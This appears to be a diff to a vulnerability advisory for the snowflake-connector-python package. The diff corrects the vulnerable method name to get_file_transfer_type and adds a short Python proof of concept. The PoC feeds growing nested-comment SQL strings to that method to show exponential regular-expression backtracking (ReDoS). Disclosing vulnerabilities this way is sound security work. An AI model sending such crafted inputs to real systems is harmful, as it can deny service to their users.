@@ -26,11 +26,20 @@ snowflake-connector-python (,)
 
 ## Description
 
-An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the snowflake-connector-python PyPI package, when an attacker is able to supply arbitrary input to the `snowflake-connector-python` method
+An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the snowflake-connector-python PyPI package, when an attacker is able to supply arbitrary input to the `get_file_transfer_type` method
 
 ## PoC
 
-No PoC is supplied for this issue
+```python
+import time
+from snowflake.connector.cursor import SnowflakeCursor
+
+for i in range(100):
+    start_time = time.time()
+    sql = '/**/\n' + '\t/*/get\t*/\t/**/\n'*i + '\t*/get\n'
+    SnowflakeCursor.get_file_transfer_type(sql)
+    print("--- %s seconds ---" % (time.time() - start_time))
+```
 
 
 
